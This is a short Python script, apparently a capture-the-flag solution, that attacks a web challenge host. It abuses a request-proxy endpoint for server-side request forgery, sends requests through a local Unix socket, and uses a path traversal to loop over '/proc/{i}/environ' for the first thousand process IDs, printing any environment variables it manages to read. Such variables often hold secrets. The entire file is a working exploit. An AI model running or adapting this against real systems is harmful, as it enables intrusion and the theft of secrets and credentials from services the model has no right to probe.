import requests

URL = 'https://unixer-q8jabbltapls4aoz.boita.tech'
LOCAL = 'http://127.0.0.1:1337'

# r = requests.get(URL + '/api/v2/get_readme')
# r = requests.post(URL + '/api/v1/try_request', json={
#     'url': 'http://127.0.0.1:3000/api/v2/get_readme'
#     })
#
# print(r.text)

api_sock =  '/dev/shm/v2.sock'

for i in range(1000):
    r = requests.post(URL + '/api/v1/try_request', json={
        'url': LOCAL + f'/static//proc/{i}/environ',
        'socketPath': api_sock,
        })

    if 'Request failed with status code 500' in r.text: continue

    print(r.text)
